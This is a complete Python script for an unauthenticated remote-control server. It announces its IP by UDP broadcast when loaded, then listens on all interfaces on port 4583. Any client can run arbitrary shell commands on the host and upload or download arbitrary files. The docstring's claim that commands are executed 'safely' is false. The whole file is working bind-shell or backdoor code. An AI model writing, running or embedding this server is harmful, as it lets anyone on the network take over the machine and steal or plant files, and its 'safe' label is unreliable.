import socket
import threading
import subprocess
import os

def broadcast_server_ip():
    broadcast_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    broadcast_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    broadcast_socket.bind(("", 0))  # Bind to any available port

    server_ip = socket.gethostbyname(socket.gethostname())
    broadcast_socket.sendto(server_ip.encode(), ("<broadcast>", 4583))
    print(f"Broadcasting server IP: {server_ip}")

broadcast_server_ip()


def execute_command(command):
    """Safely execute a shell command and return its output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout or result.stderr or "Command executed."
    except Exception as e:
        return f"Error: {str(e)}"

def handle_client(client_socket):
    """Handles client requests for commands and file transfers."""
    try:
        while True:
            request = client_socket.recv(1024).decode().strip()
            if not request:
                break

            if request.startswith("UPLOAD"):
                _, filename = request.split(maxsplit=1)
                file_data = client_socket.recv(4096)
                with open(filename, 'wb') as file:
                    file.write(file_data)
                client_socket.send(b"File uploaded successfully.")

            elif request.startswith("COMMAND"):
                command = request[len("COMMAND "):].strip()
                output = execute_command(command)
                client_socket.send(output.encode())

            elif request.startswith("DOWNLOAD"):
                _, filename = request.split(maxsplit=1)
                if os.path.exists(filename):
                    with open(filename, 'rb') as file:
                        client_socket.send(file.read())
                else:
                    client_socket.send(b"File not found.")

            elif request == "EXIT":
                client_socket.send(b"Goodbye!")
                break

            else:
                client_socket.send(b"Invalid command.")
    except Exception as e:
        client_socket.send(f"Error: {str(e)}".encode())
    finally:
        client_socket.close()

def start_server():
    """Starts the TCP server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4583))
    server.listen(5)
    print("[*] Server listening on port 4583...")

    try:
        while True:
            client_socket, addr = server.accept()
            print(f"[*] Connection from {addr}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down server...")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
